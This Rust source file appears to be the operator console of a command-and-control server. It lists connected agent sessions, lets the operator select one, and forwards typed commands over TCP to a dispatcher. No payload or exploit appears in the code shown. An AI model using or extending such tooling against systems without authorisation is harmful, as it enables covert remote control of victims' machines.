use crate::{c2_state::{AgentConnection, C2State}, constants::{CYAN, DIM, RED, RESET, YELLOW, GREEN}};
use std::net::TcpStream;
use rustyline::DefaultEditor;

use crate::constants;
use crate::commands;

pub fn list_sessions(state: &C2State) -> Result<bool, String> {
    let agents = state.agents.lock().map_err(|e| e.to_string())?;

    if agents.is_empty() {
        println!("\n\t{DIM}[{RESET}{RED}sessions{RESET}{DIM}]{RESET} {YELLOW}No active connections.{RESET}\n");
        return Ok(true);
    };

    for session in agents.iter() {
        println!("\n\t{RED}{}{DIM}.{RESET} {YELLOW}{}{RESET}\n", session.id, session.ip);
    }

    Ok(true)
}

pub fn set_session(instruct: Vec<&str>, state: &C2State) -> Result<bool, String> {
    let session_id = match instruct.get(1) {
        Some(id) => id,
        None => {
            println!("\n\t{DIM}[{RESET}{RED}{}{RESET}{DIM}]{RESET} {YELLOW}ID not specified.{RESET}\n", instruct.join(" "));
            return Ok(false);
        },
    };

    let session_id: usize = match session_id.parse() {
        Ok(id) => id,
        Err(_) => {
            println!(
                "\n\t{DIM}[{RESET}{RED}session{RESET}{DIM}]{RESET} {YELLOW}Invalid ID.{RESET}\n"
            );
            return Ok(false)
        }
    };


    // Enter to the session
    match state.set_active_session(session_id) {
        Ok(_) => {
            println!(
                "\n\t{DIM}[{RESET}{GREEN}session{RESET}{DIM}]{RESET} active session set to {CYAN}{}{RESET}\n",
                session_id
            );

            let agent = state.get_active_agent()?;
            state.set_mod("operator"); 
            handle_client(agent, state)?;

            Ok(true)
        }

        Err(_) => {
            println!(
                "\n\t{DIM}[{RESET}{RED}session_{}{RESET}{DIM}]{RESET} {YELLOW}ID not found.{RESET}\n",
                session_id
            );

            Ok(true)
        }
    }
}

// 
fn handle_client_instruct(instruct: &str, conn: &mut TcpStream, state: &C2State) -> Result<bool, String> {
    commands::dispatch_client(instruct.trim().split_whitespace().collect(), conn, state)
}


fn handle_client(agent: AgentConnection, state: &C2State) -> Result<(), String>{
    // let mut buff = [0; 1024];
    let mut conn = agent.conn;
    let mut rl = DefaultEditor::new().map_err(|e| e.to_string())?;

    loop {
        // Read from CLI 
        let prompt = constants::build_prompt(&state);
        let instruct = rl.readline(&prompt).map_err(|e| e.to_string())?;

        if instruct.trim().to_ascii_lowercase() == "q" || instruct.trim().to_ascii_lowercase() == "exit" {
            state.set_mod("manager");
            break;
        }

        if !instruct.trim().is_empty() {
            let _ = rl.add_history_entry(instruct.as_str());
        }
        
        match handle_client_instruct(instruct.trim(), &mut conn, state) {
            Ok(b) if b => "",
            Err(err) => { println!("An error has ocurred: {}", err); break; }
            _ => break
        };
    }
    
    Ok(())
}